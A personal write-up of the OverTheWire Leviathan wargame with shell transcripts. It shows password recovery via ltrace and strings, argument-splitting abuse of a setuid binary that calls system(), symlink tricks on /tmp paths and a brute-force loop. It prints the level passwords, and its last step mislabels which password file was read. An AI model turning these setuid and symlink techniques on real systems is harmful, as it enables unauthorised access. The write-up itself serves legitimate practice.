###Leviathan war games - Viraj Jayasekara

######Level0:
```
//login to the level0 using p/w leviathan0//

[Viraj@server Desktop]$ ssh leviathan0@leviathan.labs.overthewire.org
```

######Level0->Level1:
```
//inside the home directory, there was a hidden directory called ".backup" and there was a file called "bookmarks.html" indide that. 'cat bookmarks.html | grep password' command was used to go through within this file to find the keyword 'password'. Therefore the password for the next level: rioGegei8m. //

leviathan0@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Jul 17 16:44 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
leviathan0@melinda:~$ cd .backup
leviathan0@melinda:~/.backup$ ls
bookmarks.html
leviathan0@melinda:~/.backup$ cat bookmarks.html | grep password
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
leviathan0@melinda:~/.backup$ 
```

######Level1->Level2:
```
//inside the home directory, there was binary file included. When it was executed, it asked for a password. Accordind to a movie called 'Hackers', the most common passwords are love, sex, secret and god. //

leviathan1@melinda:~$ ls
check

//use password as love//

leviathan1@melinda:~$ ./check
password: love
Wrong password, Good Bye ...

//trace binary file//

leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 <unfinished ...>
printf("password: ")                              = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: love
)      = 108
getchar(0x8048680, 47, 0x804a000, 0x8048642)      = 111
getchar(0x8048680, 47, 0x804a000, 0x8048642)      = 118
strcmp("lov", "sex")                              = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)              = 29
+++ exited (status 0) +++

//it is possible to identify that the password checking mechanism uses string comparsion to compare the correct password.And it is compared with 'sex'.// 

//useing 'sex' as the password//

leviathan1@melinda:~$ ./check
password: sex
$ whoami
leviathan2

//password is correct and password to the next level can be obtained by default password location//

$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
$ 
```

######Level2->Level3:
```
//check inside home directory. A binary file called "printfile" was found//

leviathan2@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile

//execute the file//

leviathan2@melinda:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename

//to exectue the file, it requires a file to be passed as an argument. Therefore a temp file was created on /tmp/vv location//

leviathan2@melinda:~$ mkdir /tmp/vv 
leviathan2@melinda:~$ touch /tmp/vv/file\ tmp.txt
leviathan2@melinda:~$ cd /tmp/vv

//check whether the temp file was created//

leviathan2@melinda:/tmp/vv$ ls -la
total 1692
drwxrwxr-x   2 leviathan2 leviathan2    4096 Oct  4 07:38 .
drwxrwx-wt 153 root       root       1724416 Oct  4 07:38 ..
-rw-rw-r--   1 leviathan2 leviathan2       0 Oct  4 07:38 file tmp.txt

//try to exectute 'printfile' while tracing//

leviathan2@melinda:/tmp/vv$ ltrace ~/printfile "file tmp.txt"
__libc_start_main(0x804852d, 2, 0xffffd754, 0x8048600 <unfinished ...>
access("file tmp.txt", 4)                         = 0
snprintf("/bin/cat file tmp.txt", 511, "/bin/cat %s", "file tmp.txt") = 21
system("/bin/cat file tmp.txt"/bin/cat: file: No such file or directory
/bin/cat: tmp.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                            = 256
+++ exited (status 0) +++

//try to create a symlink to the file that contains level3 password//

leviathan2@melinda:/tmp/vv$ ln -s /etc/leviathan_pass/leviathan3 /tmp/vv/file

//it is visible that a seperate symlink called "file" was created//

leviathan2@melinda:/tmp/vv$ ls -la
total 1692
drwxrwxr-x   2 leviathan2 leviathan2    4096 Oct  4 07:41 .
drwxrwx-wt 153 root       root       1724416 Oct  4 07:41 ..
lrwxrwxrwx   1 leviathan2 leviathan2      30 Oct  4 07:41 file -> /etc/leviathan_pass/leviathan3
-rw-rw-r--   1 leviathan2 leviathan2       0 Oct  4 07:38 file tmp.txt

//try to read the "file"//

leviathan2@melinda:/tmp/vv$ ~/printfile "file"
You cant have that file...

//try to read "file tmp.txt". and password for the next level was displayed//

leviathan2@melinda:/tmp/vv$ ~/printfile "file tmp.txt"
Ahdiemoo1j
/bin/cat: tmp.txt: No such file or directory
leviathan2@melinda:/tmp/vv$ 
```

######Level3->Level4:
```
//check inside home directory. A binary file called "level3" was found//

leviathan3@melinda:~$ ls
level3

//execute file and provide a guessed password//

leviathan3@melinda:~$ ./level3
Enter the password> love  
bzzzzzzzzap. WRONG

//password was wrong. used 'strings ./level3' command to identify any string within the file//

leviathan3@melinda:~$ strings ./level3
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
puts
__stack_chk_fail
stdin
printf
fgets
system
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.0
PTRh@
snlp
rintf
D$L1
D$#bombf
D$'ad
D$8...s
D$<3cr3f
D$@t
D$*h0nof
D$.33
D$1kakaf
D$5ka
D$B*32.
D$F2*[xf
D$J]
T$Le3
[^_]
[You've got shell]!
/bin/sh
bzzzzzzzzap. WRONG
Enter the password> 
;*2$"
secret
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
/usr/lib/gcc/x86_64-linux-gnu/4.8/include
/usr/include/bits
/usr/include
level3.c
stddef.h
types.h
libio.h
stdio.h
__off_t
_IO_read_ptr
_chain
do_stuff
size_t
_shortbuf
_IO_buf_base
long long unsigned int
long long int
other
_fileno
_IO_read_end
_flags
_IO_buf_end
_cur_column
__quad_t
_old_offset
level3.c
_IO_marker
stdin
_IO_write_ptr
_sbuf
short unsigned int
_IO_save_base
kaka
_lock
_flags2
_mode
sizetype
_IO_write_end
kaka2
_IO_lock_t
_IO_FILE
GNU C 4.8.2 -m32 -mtune=generic -march=i686 -g -fstack-protector
_pos
_markers
unsigned char
short int
asdf
_vtable_offset
_next
__off64_t
_IO_read_base
_IO_save_end
/root/OverTheWire-games/games/leviathan/leviathan3
__pad1
__pad2
__pad3
__pad4
__pad5
_unused2
morenothing
_IO_backup_base
main
_IO_write_base
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6590
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
level3.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strcmp@@GLIBC_2.0
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
fgets@@GLIBC_2.0
_edata
_fini
__stack_chk_fail@@GLIBC_2.4
__data_start
puts@@GLIBC_2.0
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
stdin@@GLIBC_2.0
_end
_start
_fp_hw
nothing
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
do_stuff
_init

//after 'snlprintf',it was mentioned that '[You've got shell]!'. therefore, used password as 'snlprintf'. //

leviathan3@melinda:~$ ./level3
Enter the password> snlprintf
[You've got shell]!

//relocated to level4 shell//

$ whoami
leviathan4

//get level4 password from default password location//

$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
$ 
```

######Level4->Level5:
```
//check inside home directory. A hidden directory called ".trash" was found//
leviathan4@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root root       4096 Nov 14  2014 .
drwxr-xr-x 167 root root       4096 Jul  9 16:27 ..
-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root root        675 Apr  9  2014 .profile
dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash

//check inside ".trash" directory. a binary file called "bin" was found.//

leviathan4@melinda:~$ cd .trash
leviathan4@melinda:~/.trash$ ls -la
total 16
dr-xr-x--- 2 root       leviathan4 4096 Nov 14  2014 .
drwxr-xr-x 3 root       root       4096 Nov 14  2014 ..
-r-sr-x--- 1 leviathan5 leviathan4 7425 Nov 14  2014 bin

//execute 'bin'. a binary number was displayed. it was converted to ASCII by using a online binary-to-ascii converter. then the password for the next level was retrieved : Tith4cokei//

leviathan4@melinda:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
leviathan4@melinda:~/.trash$ 
```

######Level5->Level6:
```
//check inside home directory. a binary file called 'leviathan5' was found//

leviathan5@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5

//execute binday file.//

leviathan5@melinda:~$ ./leviathan5
Cannot find /tmp/file.log

//a symlink to the location of level6 password was created within /tmp/file.log //

leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

//when the file was executed, password for the next level was retrieved//

leviathan5@melinda:~$ ./leviathan5
UgaoFee4li
leviathan5@melinda:~$ 
```

######Level6->Level7:
```
//check inside home direcotry. a binary file called 'lveiathan6' was found.//

leviathan6@melinda:~$ ls
leviathan6

//execute file. a <4 digit code> was needed to execute it properly.//

leviathan6@melinda:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@melinda:~$ ./leviathan6 2123
Wrong

//create a temp location to work.
leviathan6@melinda:/$ mkdir /tmp/vv
leviathan6@melinda:/$ cd /tmp/vv/

//possible <4 digit code> range is form '0000' to '9999'. therefore a small script was designed to run 'leviathan6' file with all possible arguments within a loop.//

leviathan6@melinda:/tmp/vv$ vi loop.sh

//loop.sh:
#!/bin/bash
 
for i in {0000..9999}
do
~/leviathan6 $i
done
//

//provide permissions//

leviathan6@melinda:/tmp/vv$ chmod +x loop.sh

//execute 'loop.sh' //

leviathan6@melinda:/tmp/vv$ ./loop.sh

//it will take around 15 seconds to complete and once done, the shell will be relocated to level7//

$whoami
leviathan7

//get password for level 7//

$ cat /etc/leviathan_pass/leviathan4
ahy7MaeBo9
```

######Level7:
```
leviathan7@melinda:~$ ls
CONGRATULATIONS
leviathan7@melinda:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
leviathan7@melinda:~$ 
```
